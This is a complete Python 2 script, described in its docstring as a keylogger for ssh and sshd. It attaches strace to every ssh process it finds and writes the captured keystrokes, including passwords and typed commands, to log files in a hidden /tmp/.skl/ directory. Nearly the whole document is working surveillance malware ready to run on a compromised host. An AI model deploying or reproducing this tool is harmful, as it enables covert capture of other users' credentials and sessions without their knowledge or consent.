#!/usr/bin/python

"""This program logs all keystrokes sent to and from ssh and
sshd.  It does this by attaching strace to a ssh process and parsing out the
keystrokes."""

from subprocess import Popen, PIPE
from re import split
from time import sleep
import threading
import re
import os

class Process(object):
    """Parses out the process list."""

    def __init__(self, proc_info):

        self.user  = proc_info[0]
        self.pid   = proc_info[1]
        self.cmd   = proc_info[10]

        try:
            self.arg   = proc_info[11]
        except IndexError:
            self.arg = ""

    def find_sshd(self):
        """Returns ssh connections to the machine."""
        if "pts" in self.arg:
            return "New SSHD Incoming Connection: %s Running on PID %s" % \
            (self.arg, self.pid)

    def find_ssh(self):
        """Returns ssh connections from the machine."""
        if self.cmd == "ssh":
            return "New Outgoing connection from %s to %s with the PID %s" % \
            (self.user, self.arg, self.pid)

def get_ps():
    """Retreives information from ps."""
    proc_list = []
    sub_proc = Popen(['ps', 'auxw'], shell=False, stdout=PIPE)
    # Remove header
    sub_proc.stdout.readline()
    for line in sub_proc.stdout:
        #Split based on whitespace
        if "ssh" in line:
            proc_info =  split(" *", line.strip())
            proc_list.append(Process(proc_info))
    return proc_list

def keylogger_ssh(proc):
    """Keylogger for ssh."""
    print "Starting Keylogger to montior %s connecting to %s on %s" % \
    (proc.user, proc.arg, proc.pid)

    # Open SSH process using strace
    logger = Popen(['strace', '-s', '16384', '-p', proc.pid, "-e", \
    "read"], shell=False, stdout=PIPE, stderr=PIPE)

    # Open the log file
    logfilename = DIR + proc.user + "_" + proc.arg + "_" + proc.pid +"_ssh.log"
    logfile = open(logfilename,"a")

    while True:
        # Check to see if strace has closed
        logger.poll()
        # Read output from strace
        output = logger.stderr.readline()
        #  Close log file if strace has ended
        if not output and logger.returncode is not None:
            print "Connection closed from %s PID %s" % (proc.arg, proc.pid)
            logfile.close()
            SSHPROCS.remove(proc.pid)
            break
        # Only log the user's input
        if "read(" in output and ", 16384)" in output and "= 1" in output:
            keystroke = re.sub(r'read\(.*, "(.*)", 16384\).*= 1', r'\1', \
            output)
            # Strip new linesps
            keystroke = keystroke.rstrip('\n')
            # convert \r to new line
            keystroke = re.sub(r'\\r', r'\n', keystroke)
            # convert \3 to a ^C
            keystroke = re.sub(r'\\3', r'^C\n', keystroke)
            # convert \4 to a ^D
            keystroke = re.sub(r'\\4', r'^D\n', keystroke)
            # convert \177 to \b
            keystroke = re.sub(r'\\177', r'\\b', keystroke)
            # convert \27 to \w
            keystroke = re.sub(r'\\27', r'\\w', keystroke)
            logfile.write(keystroke)

def keylogger_sshd(proc):
    """Keylogger for SSHD."""
    print "Starting Keylogger to monitor %s connection on %s" % \
    (proc.user, proc.pid)

    # Open SSH process using strace
    logger = Popen(['strace', '-s', '16384', '-p', proc.pid, "-e", \
    "write"], shell=False, stdout=PIPE, stderr=PIPE)

    # Open the log file
    logfilename = DIR + proc.user + "_" + proc.pid +"_sshd.log"
    logfile = open(logfilename,"a")

    while True:
        # Check to see if strace has closed
        logger.poll()
        # Read output from strace
        output = logger.stderr.readline()
        #  Close log file if strace has ended
        if not output and logger.returncode is not None:
            print "Connection closed from %s PID %s" % (proc.arg, proc.pid)
            logfile.close()
            SSHPROCS.remove(proc.pid)
            break

        if "write" in output and ", 1)" in output:
            keystroke = re.sub(r'write\(.*, "(.*)", 1\).*', r'\1', output)
            # Strip new lines
            keystroke = keystroke.rstrip('\n')
            # convert \r to new line
            keystroke = re.sub(r'\\r', r'\n', keystroke)
            # convert \3 to a ^C
            keystroke = re.sub(r'\\3', r'^C\n', keystroke)
            # convert \4 to a ^D
            keystroke = re.sub(r'\\4', r'^D\n', keystroke)
            # convert \177 to \b
            keystroke = re.sub(r'\\177', r'\\b', keystroke)
            # convert \27 to \w
            keystroke = re.sub(r'\\27', r'\\w', keystroke)
            logfile.write(keystroke)

def check_ps():
    """Checks to see if any new ssh processes are running."""
    pslist = get_ps()
    for proc in pslist:
        # Check to see if SSHD process is already monitored
        if proc.find_sshd():
            if proc.pid not in SSHPROCS:
                SSHPROCS.append(proc.pid)
                print proc.find_sshd()
                tsshd = threading.Thread(target=keylogger_sshd, args=[proc])
                tsshd.start()
        # Check to see if SSH process is already monitored
        elif proc.find_ssh():
            if proc.pid not in SSHPROCS:
                SSHPROCS.append(proc.pid)
                print proc.find_ssh()
                tssh = threading.Thread(target=keylogger_ssh, args=[proc])
                tssh.start()

if __name__ == "__main__":

    SSHPROCS = []
    # Directory to save logs to
    DIR = "/tmp/.skl/"
    # How often to look for new processes
    CHECKEVERY = 2

    print "Logging SSH processes\n"

    # Create log directory if it does not exist
    if not os.path.exists(DIR):
        os.makedirs(DIR)

    # Check for new processes
    while True:
        check_ps()
        sleep(CHECKEVERY)
